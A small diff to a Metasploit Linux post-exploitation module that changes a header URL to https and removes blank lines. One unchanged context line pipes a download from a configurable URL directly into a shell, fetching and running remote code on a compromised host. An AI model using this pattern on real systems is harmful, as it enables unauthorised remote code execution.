@@ -1,10 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Linux::System
 
@@ -116,5 +115,4 @@ class MetasploitModule < Msf::Post
       cmd_exec_vprint("#{@http_client} #{@stdout_option} #{datastore['URL']} 2>/dev/null | #{@shell}")
     end
   end
-
 end
